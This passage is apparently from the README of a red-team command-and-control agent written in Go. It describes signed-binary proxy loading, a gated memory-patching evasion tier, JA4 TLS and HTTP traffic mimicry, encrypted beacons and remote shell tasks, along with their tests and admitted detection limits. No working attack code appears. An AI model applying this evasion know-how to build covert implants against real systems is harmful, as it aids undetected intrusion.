  HOST process's pid) plus the host binary's Authenticode status in the run
  evidence (`hostSigStatus: Valid`, `hostSigner: CN=Microsoft Windows, …`) — a
  Microsoft-signed binary really loading and running our code is REPORTED as
  measured evidence, never asserted.

`agents/native/harness/dllprobe/` is a stdlib-only LoadLibrary/GetProcAddress probe
(`dllprobe.exe <dll> <status-out.json>`) that calls `VarvelStatus` directly — it
isolates the DLL from a host-side invocation failure when diagnosing.

## Tests

```bash
# Go unit + cross-implementation vectors + envelope parity + JA4 capture + h2 round
# trip (hermetic save the envelope parity leg, which drives node harness/
# enc-vectors.mjs live and skips cleanly without a node runtime on PATH):
cd agents/native && (contained env) ../../tools/go/bin/go.exe test ./...

# Integration (guarded — spawns the real channel + the compiled binary):
cd varvel && VARVEL_NATIVE_IT=1 node --test test/native-agent.test.mjs
```

The Go suite asserts: Node-computed HMAC/SHA256 vectors (cross-implementation), the
envelope layer both directions against the LIVE Node engine (see "Envelope
encryption — the parity PROOF"), the enc wire against a stub listener in required mode
(capability gate, sealed down/up, downgrade refusal, tamper-evidence), the shaping
pack (Node-pinned batch-window parity vectors, expectedWireHeaders-order pins, the
ordered emitter's wire bytes captured raw off a loopback listener, JA4H oracle parity
for all three shaped profiles GET+POST via harness/shape-observe.mjs, the `:pad`
context, batch-dwell target selection), the FoxIO official JA4 worked example,
wire-byte JA4 parity with the Node oracle, profile contrast vs the documented Chrome
shape, h2 negotiation per profile, the governed round trip against a stub listener
(204-uniform, strict seq, kill silence), exec containment (cwd-lock, 60KB cap, 20s
timeout), and the evasion tier hermetically (snapshot/patch/verify/restore byte math
over fake regions, the typed-error rails, idempotency + tamper honesty, the spec-gate
port, the evidence JSON field set the channel parser reads, the double-gate refusal
texts, and the Node-computed recipe-hash pins).

**Test registration**: both suites ARE registered in `package.json` `"test"` —
`test/native-agent.test.mjs` (skips cleanly without `VARVEL_NATIVE_IT=1`) and
`test/execproxy.test.mjs` (the signed-proxy execution tier; hermetic save the last
test, which skips without `VARVEL_LIVE_PROXY=1`) — so the default suite stays green
with both guards off.

## Honest limits (the complete list)

1. http wire only. dns/ws/stg/smb/ghc/doh/icmp legs are not implemented (the channel
   supports them; this tier speaks the reference `/c` `/r` wire).
2. Envelope encryption is supported on the http leg (`-enc`, byte-exact
   `engine/envelope.mjs` port, parity proven both directions) — but enc seals CONTENT,
   not SHAPE: sizes, cadence, and header shape stay observable. The shaping pack is
   supported too (see its section) — with ONE measured interaction: the JA4H claim is
   computed for the non-enc wire, so enc+shape measures one header (`x-varvel-enc`)
   over the claim and shapegrade reports the divergence. Channel-delivered legacy
   timing profiles (`x-varvel-profile`) and channel-assigned JA4/transport adoption
   remain unimplemented (JA4 control is launch-time `-tls-profile` only).
3. Task set is `note`/`echo`/`shell` plus the GATED `evasion-*` kinds (the evasion
   tier above: double-gated, default OFF both halves) — no fetch/stage, no pivot
   mesh, no socks, no inline-dotnet, no persist tier (each is loudly
   `unknown task kind`).
4. `shell` is a PowerShell child — a visible child process with script text on its
   command line, cwd-confined, capped, timed out. Not an in-memory execution tier.
5. Shaping is the HTTP-request layer only, on the HTTP/1.1 wire: paths, ordered
   headers, cadence, batch windows, padding. It does NOT touch the TLS ClientHello
   (JA4 stays `-tls-profile`), and a shaped HTTPS leg constrains ALPN to http/1.1
   (the ordered byte stream requires it) — so the JA4 `_a_` ALPN digit reads `h1`
   there and header-order shaping over negotiated h2 is NOT delivered (the profiles'
   `expect.h2` says exactly this). An UNSHAPED agent's headers remain the minimal
   governed set (flagged `FP-HTTP-MINIMAL`/`FP-XHEADERS` — measured, accepted).
6. No connection pooling on the https+chrome leg (fresh handshake per request).
7. No sleepmask/UDRL — see the section above. GC pause + runtime chatter exist; this
   is a Go binary and looks like one under memory forensics.
8. `-tls-insecure` exists for the lab; production use requires a proper server cert or
   it refuses the handshake (default verification is ON).
9. The token rides the command line (process-list visible) — inherited from the sim
   agent's documented model; a stage-2 hardening item.
10. JA4 mimicry is TLS-layer string equality, not whole-stack indistinguishability:
    TCP/JA4T, HTTP-layer/JA4H, timing, and behavior all remain independently measurable.
